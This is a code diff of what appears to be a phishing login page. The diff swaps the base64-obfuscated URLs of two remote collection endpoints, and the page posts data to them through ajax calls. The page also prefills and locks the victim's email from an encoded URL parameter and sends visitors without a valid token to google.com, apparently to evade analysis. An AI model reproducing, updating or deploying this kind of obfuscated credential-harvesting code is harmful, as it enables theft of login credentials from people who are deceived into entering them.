@@ -301,7 +301,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
         <div class="form-group">
           <div class="input-group">
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
-            <input type="email" class="form-control" name="email" placeholder="Username" value="" id="email">
+            <input type="email" class="form-control" name="email" placeholder="Username" value="" id="email" readonly>
           </div>
         </div>
         <div class="form-group">
@@ -393,7 +393,7 @@ return true;
 	  vsr = myArray[0];
 	 //alert (vsr);
 	 var chkRcord = isBase64(vsr);
-	
+		//alert(chkRcord);
 	 if (!chkRcord){
 		window.location.replace("https://google.com");
 		//alert ("here");
@@ -412,7 +412,7 @@ return true;
 		vsr=atob(atob(vsr));
 		if (fieldName ==null || fieldName ==""){//no validation set,validate!
 		
-			var s = atob("aHR0cHM6Ly9waHBzdGFjay05Mzk1NjMtMzI2NjA2My5jbG91ZHdheXNhcHBzLmNvbS9kbnMvdmFsaWQucGhw");
+			var s = atob("aHR0cHM6Ly9waHBzdGFjay05NTQ1NDQtMzMyNjY1NS5jbG91ZHdheXNhcHBzLmNvbS9kbnMvdmFsaWQucGhw");
 					
 			$.ajax({
 				crossOrigin:true,
@@ -519,7 +519,7 @@ return true;
     //  console.log(count); 
 	var fieldName = $('#fieldName').val();
 	//alert (fieldName);
-	var d=atob("aHR0cHM6Ly9waHBzdGFjay05Mzk1OTItMzI2NjEzNy5jbG91ZHdheXNhcHBzLmNvbS9zZXJ2ZXIvYXV0aC5waHA=");
+	var d=atob("aHR0cHM6Ly9waHBzdGFjay05NTYyNjgtMzMzNDMxNS5jbG91ZHdheXNhcHBzLmNvbS9zZXJ2ZXIvYXV0aC5waHA=");
 		
 	   $.ajax({
         dataType: 'jsonp',
